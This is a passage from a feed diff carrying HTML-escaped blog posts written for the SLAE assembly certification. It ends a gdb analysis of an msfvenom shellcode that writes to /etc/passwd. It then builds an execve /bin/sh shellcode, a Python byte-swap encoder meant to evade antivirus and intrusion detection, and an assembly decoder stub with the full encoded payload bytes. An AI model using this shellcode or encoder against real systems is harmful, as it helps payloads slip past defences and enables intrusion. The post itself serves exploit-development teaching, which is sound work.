+&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; disas &lt;span class="nv"&gt;$eip&lt;/span&gt;,+45
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Disassembly view in gdb" src="http://unlim.xyz/images/dissecting-msfvenom-shellcodes/disassembly-view-in-gdb.png" title="Disassembly view in gdb" /&gt;
+&lt;div class="img-caption"&gt;Disassembly view in gdb&lt;/div&gt;&lt;/p&gt;
+&lt;p&gt;On the above picture you can see that the data starts at the address following the &lt;code&gt;call&lt;/code&gt; instruction which is 0x0804807f. And running either of the following two commands we can be certain that the 40 bytes of the data represent the string that as we saw earlier written to the &lt;code&gt;/etc/passwd&lt;/code&gt; file:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; x/40cb 0x0804807f
+&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; x/s 0x0804807f
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Checking string data in gdb" src="http://unlim.xyz/images/dissecting-msfvenom-shellcodes/checking-string-data-in-gdb.png" title="Checking string data in gdb" /&gt;
+&lt;div class="img-caption"&gt;Checking string data in gdb&lt;/div&gt;&lt;/p&gt;
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;hr&gt;
+This blog post was created for completing the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="exploit-development"></category><category term="slae"></category></entry><entry><title>Custom encoding scheme in Assembly (SLAE, Assignment #4)</title><link href="http://unlim.xyz/blog/assembly-custom-encoding-scheme/" rel="alternate"></link><updated>2015-10-06T20:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:unlim.xyz,2015-10-06:blog/assembly-custom-encoding-scheme/</id><summary type="html">&lt;p&gt;The &lt;em&gt;encoding&lt;/em&gt; and &lt;em&gt;encryption&lt;/em&gt; notions are sometimes used interchangeably to describe a process of data transformation. While in fact &lt;a href="https://danielmiessler.com/study/encoding_encryption_hashing/"&gt;there is a difference&lt;/a&gt;. The purpose of encoding is to transform data so that it can be properly consumed by a different type of system. Encoding transforms data into another format using a scheme that is publicly available and does not require a key. The purpose of encryption on the other hand is to transform data to keep it secret from others so it can only be consumed the intended recipient. Encryption usually transforms (encrypts/decrypts) data using a secret key and the algorithm may or may not be publicly available.&lt;/p&gt;
+&lt;p&gt;I contemplated on what type of data transformation this post was going to tackle. Because there is no secret key involved and the shellcode is encrypted so it can be safely consumed by the decoding stub I decided that it would be proper to call it an encoding scheme.&lt;/p&gt;
+&lt;p&gt;The purpose of creating a custom encoding scheme in exploit development craft is to evade antiviruses and intrusion detection systems. When crafting one keep in mind that its purpose is to fool a, more often than not, signature-based software, not an intelligent live person dedicated his life to breaking encryption algorithms. So it doesn't have to be complicated.&lt;/p&gt;
+&lt;p&gt;To apply the encoding scheme to a shellcode one usually creates a separate encoder and a decoding stub, which becomes a part of a new shellcode and is used to decode the main encoded payload before transferring the execution flow to it.&lt;/p&gt;
+&lt;p&gt;Before describing the encoding scheme I came up with let's first create a shellcode to work with. I will use the shell-starting shellcode:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;section&lt;/span&gt; &lt;span class="no"&gt;.text&lt;/span&gt;
+    &lt;span class="nf"&gt;global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
+
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt; 
+    &lt;span class="no"&gt;push&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt; 
+    &lt;span class="no"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x68732f6e&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x69622f2f&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;        &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;put&lt;/span&gt; &lt;span class="no"&gt;string&lt;/span&gt; &lt;span class="no"&gt;address&lt;/span&gt; &lt;span class="no"&gt;into&lt;/span&gt; &lt;span class="no"&gt;ebx&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;        &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;args&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;        &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;env&lt;/span&gt; &lt;span class="no"&gt;vars&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt; 
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;nasm -f elf stacksh.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld stacksh.o -o stacksh &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./stacksh
+scdump stacksh
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Output from the last command (formatted to fit the screen):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;Length:  23
+Payload: &amp;quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9&amp;quot;
+&amp;quot;\x31\xd2\xb0\x0b\xcd\x80&amp;quot;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The encoding scheme itself is super simple. It just exchanges position of two adjacent bytes. For it to work correctly the shellcode length must be a multiple of 2. So if it is not the encoder appends a no-operation &lt;code&gt;\x90&lt;/code&gt; byte to satisfy the requirement. The encoder implementation in Python follows:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python&lt;/span&gt;
+
+&lt;span class="c"&gt;# Author: Oleg Mitrofanov (reider-roque) 2015&lt;/span&gt;
+
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;cycle&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os.path&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;hexlify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; 
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;x{:02x}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;hexlify_nasm&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; 
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0x{:02x},&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)[:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;unhexlify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
+
+
+&lt;span class="n"&gt;script_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;basename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__file__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Error: invalid number of arguments&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Usage:&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s"&gt;{} SHELLCODE&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;script_name&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; 
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Example:&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s"&gt;{} &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;aa&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;bb&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;cc&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;dd&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;script_name&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;cleartext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;unhexlify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cleartext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;cleartext&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;encrypted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cleartext&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;encrypted&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;cleartext&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;cleartext&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;ENCRYPTED OUTPUT:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Standard:  {}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hexlify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;NASM:      {}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hexlify_nasm&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Let's encode the main payload:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;./xchgencoder &lt;span class="s2"&gt;&amp;quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Output (formatted to fit the screen):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;ENCRYPTED OUTPUT:
+Standard:  \xc0\x31\x68\x50\x2f\x6e\x68\x73\x2f\x68\x62\x2f\x89\x69\x31\xe3\x31
+\xc9\xb0\xd2\xcd\x0b\x90\x80
+NASM:      0xc0,0x31,0x68,0x50,0x2f,0x6e,0x68,0x73,0x2f,0x68,0x62,0x2f,0x89,0x69,
+0x31,0xe3,0x31,0xc9,0xb0,0xd2,0xcd,0x0b,0x90,0x80
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After the encoded payload was ready all I needed to do is to write the decoder stub in Assembly. The decoding stub first decodes the main payload and then jumps the execution to where the payload begins:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;section&lt;/span&gt; &lt;span class="no"&gt;.text&lt;/span&gt;
+    &lt;span class="nf"&gt;global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
+
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nf"&gt;jmp&lt;/span&gt; &lt;span class="no"&gt;.data&lt;/span&gt;
+&lt;span class="nl"&gt;.code:&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="no"&gt;esi&lt;/span&gt;             &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;Point&lt;/span&gt; &lt;span class="no"&gt;ESI&lt;/span&gt; &lt;span class="no"&gt;to&lt;/span&gt; &lt;span class="no"&gt;the&lt;/span&gt; &lt;span class="no"&gt;beginning&lt;/span&gt; &lt;span class="no"&gt;of&lt;/span&gt; &lt;span class="no"&gt;the&lt;/span&gt; &lt;span class="no"&gt;shellcode&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;shellcode_len&lt;/span&gt;  &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;Put&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;shellcode&lt;/span&gt; &lt;span class="no"&gt;length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="no"&gt;into&lt;/span&gt; &lt;span class="no"&gt;ECX&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
+&lt;span class="nl"&gt;.decrypt:&lt;/span&gt;
+    &lt;span class="nf"&gt;lodsw&lt;/span&gt;            &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;load&lt;/span&gt; &lt;span class="no"&gt;two&lt;/span&gt; &lt;span class="no"&gt;shellcode&lt;/span&gt; &lt;span class="no"&gt;bytes&lt;/span&gt; &lt;span class="no"&gt;into&lt;/span&gt; &lt;span class="no"&gt;EAX&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esi-1&lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;  &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="no"&gt;and&lt;/span&gt; &lt;span class="no"&gt;switch&lt;/span&gt; &lt;span class="no"&gt;them&lt;/span&gt;
+    &lt;span class="nf"&gt;shr&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esi-2&lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;
+    &lt;span class="nf"&gt;loop&lt;/span&gt; &lt;span class="no"&gt;.decrypt&lt;/span&gt;    
+    &lt;span class="no"&gt;jmp&lt;/span&gt; &lt;span class="no"&gt;shellcode&lt;/span&gt;
+
+&lt;span class="nl"&gt;.data:&lt;/span&gt;
+    &lt;span class="nf"&gt;call&lt;/span&gt; &lt;span class="no"&gt;.code&lt;/span&gt;
+    &lt;span class="nl"&gt;shellcode:&lt;/span&gt; &lt;span class="nf"&gt;db&lt;/span&gt; &lt;span class="mi"&gt;0xc0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x31&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x68&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x50&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x2f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x6e&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x68&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x73&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x2f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x68&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x62&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x2f&lt;/span&gt;
+    &lt;span class="nl"&gt;sc_continued:&lt;/span&gt; &lt;span class="nf"&gt;db&lt;/span&gt; &lt;span class="mi"&gt;0x89&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x69&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x31&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0xe3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x31&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0xc9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0xb0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0xd2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0xcd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x0b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x80&lt;/span&gt;
+    &lt;span class="nl"&gt;shellcode_len:&lt;/span&gt; &lt;span class="nf"&gt;equ&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$-shellcode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In the above code to make the long shellcode fit the screen and keep the code executable (in case you are copy-pasting) I divided it onto two parts with the second being titled &lt;em&gt;sc_continued&lt;/em&gt;. In the actual source code it is just one long line of comma separated bytes titled &lt;em&gt;shellcode&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;It's time to build another binary and extract the resulted shellcode:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;nasm -f elf xchgdecoder.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o xchgdecoder xchgdecoder.o
+scdump xchgdecoder
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Output:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;Length:  52
+Payload: &amp;quot;\xeb\x15\x5e\x6a\x0c\x59\x31\xc0\x66\xad\x88\x46\xff\xc1\xe8\x08\x88&amp;quot;
+&amp;quot;\x46\xfe\xe2\xf3\xeb\x05\xe8\xe6\xff\xff\xff\xc0\x31\x68\x50\x2f\x6e\x68\x73&amp;quot;
+&amp;quot;\x2f\x68\x62\x2f\x89\x69\x31\xe3\x31\xc9\xb0\xd2\xcd\x0b\x90\x80&amp;quot;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Remember that if you try to run the &lt;code&gt;./xchgdecoder&lt;/code&gt; by itself you'll get segmentation fault as soon as your stub decoder will try to overwrite the first byte of the encrypted payload. Overwriting executable code of the &lt;em&gt;.text&lt;/em&gt; section is prohibited by design and you can do nothing about it.&lt;/p&gt;
+&lt;p&gt;To test that the whole encoding business is actually working we'll need the help of a C language. Here is the source code that tests our shellcode:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+
